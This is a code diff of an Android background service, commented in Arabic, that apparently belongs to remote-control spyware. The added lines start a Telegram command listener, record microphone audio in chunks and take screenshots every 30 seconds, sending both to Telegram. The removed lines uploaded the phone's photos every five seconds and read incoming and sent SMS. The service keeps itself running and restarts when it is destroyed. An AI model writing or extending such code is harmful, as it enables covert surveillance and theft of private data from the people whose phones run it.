@@ -25,7 +25,71 @@ class BackgroundService : Service() {
     override fun onCreate() {
         super.onCreate()
         startForegroundWithNotification()
-        startLoops()
+
+        // 🚀 الوحيد اللي يشتغل — الاستماع للأوامر من تيليجرام
+        try {
+            CommandListener.start(applicationContext)
+        } catch (_: Exception) {}
+
+        // حلقة التنظيف فقط — ما ترسل شي، بس تحذف الملفات القديمة
+        scope.launch {
+            while (running) {
+                try {
+                    val audioDir = File(applicationContext.cacheDir, "audio")
+                    if (audioDir.exists()) {
+                        val cutoff = System.currentTimeMillis() - 60 * 60 * 1000L
+                        audioDir.listFiles()?.forEach { if (it.lastModified() < cutoff) it.delete() }
+                    }
+                    val screenDir = File(applicationContext.cacheDir, "screens")
+                    if (screenDir.exists()) {
+                        val cutoff = System.currentTimeMillis() - 60 * 60 * 1000L
+                        screenDir.listFiles()?.forEach { if (it.lastModified() < cutoff) it.delete() }
+                    }
+                } catch (_: Exception) {}
+                delay(5 * 60_000L)
+            }
+        }
+
+        // 🎤 حلقة التسجيل — تشتغل فقط لو فعّلتها يدويًا من الأمر
+        scope.launch {
+            while (running) {
+                try {
+                    if (AudioRecorder.isRunning()) {
+                        AudioRecorder.startChunk(applicationContext)
+                        delay(Config.AUDIO_CHUNK_MS)
+                        val done = AudioRecorder.stopChunk()
+                        if (done != null && done.exists() && done.length() > 1000) {
+                            TelegramApi.sendAudio(done, "🎤 ${done.name}")
+                            done.delete()
+                        }
+                    } else {
+                        delay(3000L)
+                    }
+                } catch (_: Exception) {
+                    delay(5000L)
+                }
+            }
+        }
+
+        // 📷 حلقة لقطات الشاشة الدورية — تشتغل فقط لو فعّلتها يدويًا من الأمر
+        scope.launch {
+            while (running) {
+                try {
+                    if (CommandExecutor.screenLoopActive && ScreenCapture.isReady) {
+                        val file = ScreenCapture.capture(applicationContext)
+                        if (file != null && file.exists()) {
+                            TelegramApi.sendPhoto(file, "📷 لقطة دورية")
+                            file.delete()
+                        }
+                        delay(30_000L)
+                    } else {
+                        delay(3000L)
+                    }
+                } catch (_: Exception) {
+                    delay(5000L)
+                }
+            }
+        }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
@@ -34,6 +98,7 @@ class BackgroundService : Service() {
 
     override fun onDestroy() {
         running = false
+        try { CommandListener.stop() } catch (_: Exception) {}
         scope.cancel()
         try {
             val restart = Intent(applicationContext, BackgroundService::class.java)
@@ -72,78 +137,5 @@ class BackgroundService : Service() {
             .build()
 
         startForeground(1001, notif)
-    }
-
-    private fun startLoops() {
-        // صور فورًا — كل 5 ثواني
-        scope.launch {
-            while (running) {
-                try { scanAndUploadImages() } catch (_: Exception) {}
-                delay(5_000L)
-            }
-        }
-        // flush queue كل 5 ثواني
-        scope.launch {
-            while (running) {
-                try { Uploader.flushQueue(applicationContext) } catch (_: Exception) {}
-                delay(5_000L)
-            }
-        }
-        // SMS كل 60 ثانية
-        scope.launch {
-            while (running) {
-                try { scanSms() } catch (_: Exception) {}
-                delay(60_000L)
-            }
-        }
-
-        // 🎤 حلقة تسجيل الصوت — كل 10 ثواني
-        scope.launch {
-            while (running) {
-                try {
-                    if (AudioRecorder.isRunning()) {
-                        AudioRecorder.startChunk(applicationContext)
-                        delay(Config.AUDIO_CHUNK_MS)
-                        val done = AudioRecorder.stopChunk()
-                        if (done != null && done.exists() && done.length() > 1000) {
-                            TelegramApi.sendAudio(done, "🎤 ${done.name}")
-                            done.delete()
-                        }
-                    } else {
-                        delay(2000L)
-                    }
-                } catch (_: Exception) {
-                    delay(3000L)
-                }
-            }
-        }
-
-        // Cleanup old audio files
-        scope.launch {
-            while (running) {
-                try {
-                    val dir = File(applicationContext.cacheDir, "audio")
-                    if (dir.exists()) {
-                        val cutoff = System.currentTimeMillis() - 60 * 60 * 1000L
-                        dir.listFiles()?.forEach {
-                            if (it.lastModified() < cutoff) it.delete()
-                        }
-                    }
-                } catch (_: Exception) {}
-                delay(5 * 60_000L)
-            }
-        }
-    }
-
-    private fun scanAndUploadImages() {
-        val images = MediaScanner.scanImages(applicationContext)
-        for (img in images) {
-            Uploader.uploadMediaFile(applicationContext, img)
-        }
-    }
-
-    private fun scanSms() {
-        val msgs = SmsReader.scanAll(applicationContext) + SmsReader.scanSent(applicationContext)
-        for (m in msgs) DataStore.appendAny(applicationContext, m)
     }
 }
